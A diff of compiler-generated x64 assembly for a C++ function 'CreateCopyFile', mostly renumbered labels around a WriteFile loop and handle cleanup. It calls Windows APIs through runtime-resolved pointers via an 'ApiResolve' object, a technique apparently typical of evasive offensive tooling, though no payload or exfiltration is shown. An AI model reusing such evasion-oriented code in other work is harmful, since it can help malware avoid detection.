-	mov	QWORD PTR tv364[rsp], rax
+	mov	QWORD PTR pWriteFile$42[rsp], rax
+; Line 419
+	mov	rax, QWORD PTR pWriteFile$42[rsp]
+	mov	QWORD PTR tv377[rsp], rax
 	mov	QWORD PTR [rsp+32], 0
-	lea	r9, QWORD PTR bytesWritten$14[rsp]
-	mov	r8d, DWORD PTR bytesRead$6[rsp]
-	lea	rdx, QWORD PTR buffer$42[rsp]
-	mov	rcx, QWORD PTR hOut$22[rsp]
-	call	QWORD PTR tv364[rsp]
+	lea	r9, QWORD PTR bytesWritten$16[rsp]
+	mov	r8d, DWORD PTR bytesRead$8[rsp]
+	lea	rdx, QWORD PTR buffer$46[rsp]
+	mov	rcx, QWORD PTR hOut$24[rsp]
+	call	QWORD PTR tv377[rsp]
 	test	eax, eax
-	jne	SHORT $LN29@CreateCopy
-; Line 413
-	jmp	SHORT $LN11@CreateCopy
-$LN29@CreateCopy:
-; Line 416
-	mov	eax, DWORD PTR bytesRead$6[rsp]
-	cmp	DWORD PTR bytesWritten$14[rsp], eax
-	je	SHORT $LN30@CreateCopy
-; Line 417
-	jmp	SHORT $LN11@CreateCopy
-$LN30@CreateCopy:
+	jne	SHORT $LN31@CreateCopy
 ; Line 420
-	mov	eax, DWORD PTR bytesRead$6[rsp]
+	jmp	SHORT $LN11@CreateCopy
+$LN31@CreateCopy:
+; Line 423
+	mov	eax, DWORD PTR bytesRead$8[rsp]
+	cmp	DWORD PTR bytesWritten$16[rsp], eax
+	je	SHORT $LN32@CreateCopy
+; Line 424
+	jmp	SHORT $LN11@CreateCopy
+$LN32@CreateCopy:
+; Line 427
+	mov	eax, DWORD PTR bytesRead$8[rsp]
 	mov	rcx, QWORD PTR offset$17[rsp]
 	add	rcx, rax
 	mov	rax, rcx
 	mov	QWORD PTR offset$17[rsp], rax
-; Line 421
+; Line 428
 	jmp	$LN10@CreateCopy
 $LN11@CreateCopy:
-; Line 423
+; Line 430
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
-	mov	QWORD PTR tv372[rsp], rax
-	mov	rcx, QWORD PTR hCopy$7[rsp]
-	call	QWORD PTR tv372[rsp]
-; Line 424
+	mov	QWORD PTR tv385[rsp], rax
+	mov	rcx, QWORD PTR hCopy$9[rsp]
+	call	QWORD PTR tv385[rsp]
+; Line 431
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
-	mov	QWORD PTR tv375[rsp], rax
-	mov	rcx, QWORD PTR hOut$22[rsp]
-	call	QWORD PTR tv375[rsp]
+	mov	QWORD PTR tv388[rsp], rax
+	mov	rcx, QWORD PTR hOut$24[rsp]
+	call	QWORD PTR tv388[rsp]
 	npad	1
-; Line 425
+; Line 432
 	jmp	SHORT $LN8@CreateCopy
-; Line 426
+; Line 433
 	jmp	$LN7@CreateCopy
 $LN8@CreateCopy:
-; Line 427
-	mov	rcx, QWORD PTR bufferProcessInfo$8[rsp]
+; Line 434
+	mov	rcx, QWORD PTR bufferProcessInfo$10[rsp]
 	call	?FreeMemory@@YA_NPEAX@Z			; FreeMemory
 	npad	1
-; Line 428
+; Line 435
 	jmp	$LN2@CreateCopy
 $LN3@CreateCopy:
-; Line 430
-	mov	BYTE PTR $T4[rsp], 1
+; Line 437
+	mov	BYTE PTR $T6[rsp], 1
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
-	movzx	eax, BYTE PTR $T4[rsp]
+	movzx	eax, BYTE PTR $T6[rsp]
 $LN1@CreateCopy:
-; Line 431
-	add	rsp, 5984				; 00001760H
+; Line 438
+	add	rsp, 6016				; 00001780H
 	pop	rdi
 	ret	0
 ?CreateCopyFile@@YA_NPEAD0@Z ENDP			; CreateCopyFile
